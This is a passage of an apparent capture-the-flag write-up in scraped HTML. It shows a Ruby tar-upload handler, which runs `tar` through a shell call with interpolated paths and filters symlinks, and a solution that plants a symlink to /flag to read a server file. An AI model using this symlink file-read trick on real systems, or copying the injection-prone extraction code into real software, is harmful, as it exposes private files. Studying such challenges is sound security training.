class="string">&quot;Error creating directory&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">unless</span> system <span class="string">&quot;tar -xvf <span class="subst">#&#123;tempfile.path&#125;</span> -C uploads/<span class="subst">#&#123;path&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> err <span class="string">&quot;Error extracting tar file&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  links = <span class="title class_">Dir</span>.glob(<span class="string">&quot;uploads/<span class="subst">#&#123;path&#125;</span>/**/*&quot;</span>, <span class="title class_">File</span><span class="symbol">:</span><span class="symbol">:FNM_DOTMATCH</span>).select <span class="keyword">do</span> |<span class="params">f</span>|</span><br><span class="line">    <span class="comment"># Don&#x27;t show . or ..</span></span><br><span class="line">    <span class="keyword">if</span> [<span class="string">&quot;.&quot;</span>, <span class="string">&quot;..&quot;</span>].<span class="keyword">include</span>? <span class="title class_">File</span>.basename f</span><br><span class="line">      <span class="literal">false</span></span><br><span class="line">    <span class="comment"># Don&#x27;t show symlinks. Additionally delete them, they may be unsafe</span></span><br><span class="line">    <span class="keyword">elsif</span> <span class="title class_">File</span>.symlink? f</span><br><span class="line">      <span class="title class_">File</span>.unlink f</span><br><span class="line">      <span class="literal">false</span></span><br><span class="line">    <span class="comment"># Don&#x27;t show directories (but show files under them)</span></span><br><span class="line">    <span class="keyword">elsif</span> <span class="title class_">File</span>.directory? f</span><br><span class="line">      <span class="literal">false</span></span><br><span class="line">    <span class="comment"># Show everything else</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="literal">true</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ok links</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
 
-  links = Dir.glob(&quot;uploads/#&#123;path&#125;/**/*&quot;, File::FNM_DOTMATCH).select do |f|
-    # Don&#39;t show . or ..
-    if [&quot;.&quot;, &quot;..&quot;].include? File.basename f
-      false
-    # Don&#39;t show symlinks. Additionally delete them, they may be unsafe
-    elsif File.symlink? f
-      File.unlink f
-      false
-    # Don&#39;t show directories (but show files under them)
-    elsif File.directory? f
-      false
-    # Show everything else
-    else
-      true
-    end
-  end
-
-  return ok links
-end
-</code></pre>
 <p><strong>Solution:</strong> </p>
 <p>Create a random text file(or any other files) for just getting the uploaded path(since the symlink will not be shown on the page)</p>
 <p>Create a directory <code>flagDir </code> and in the directory, generate a symlink: <code>ln -s /flag flag</code> -&gt; generate a symlink for <code>/flag</code></p>
